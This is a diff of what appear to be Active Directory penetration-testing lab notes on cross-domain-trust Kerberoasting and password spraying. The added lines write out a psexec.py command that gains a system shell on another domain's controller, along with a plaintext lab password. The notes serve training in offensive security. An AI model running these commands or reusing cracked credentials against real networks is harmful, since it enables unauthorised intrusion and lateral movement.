@@ -13,6 +13,12 @@ GetUserSPNs.py -request -target-domain FREIGHTLOGISTICS.LOCAL INLANEFREIGHT.LOCA
 - Search for password reuse in current domain after cracking
 - Attempt single password spray with the cracked password in current domain
 
+**System shell on the other domain
+```
+psexec.py FREIGHTLOGISTICS.LOCAL/sapsso@academy-ea-dc03.inlanefreight.local -target-ip 172.16.5.238
+```
+- Password: pabloPICASSO
+
 ## Hunting Foreign Group Membership with Bloodhound-python
 
 If we are not connected to via DNS, we must edit resolv.conf
